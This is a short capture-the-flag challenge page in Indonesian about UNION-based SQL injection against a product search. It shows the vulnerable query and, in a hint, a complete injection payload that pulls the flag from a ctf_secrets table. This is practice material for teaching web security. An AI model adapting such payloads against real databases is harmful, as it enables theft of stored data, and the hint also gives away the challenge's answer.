SQL Injection — UNION Attack

Fitur pencarian produk rentan terhadap UNION-based SQL Injection. Ekstrak flag yang tersembunyi di tabel ctf_secrets menggunakan UNION SELECT!

💡 Tampilkan Hint

Query asal: SELECT id, name, price, category FROM ctf_products WHERE name LIKE '%INPUT%'

Payload UNION (4 kolom):
' UNION SELECT 1,secret_value,3,4 FROM ctf_secrets WHERE secret_name='flag_sqli2'--
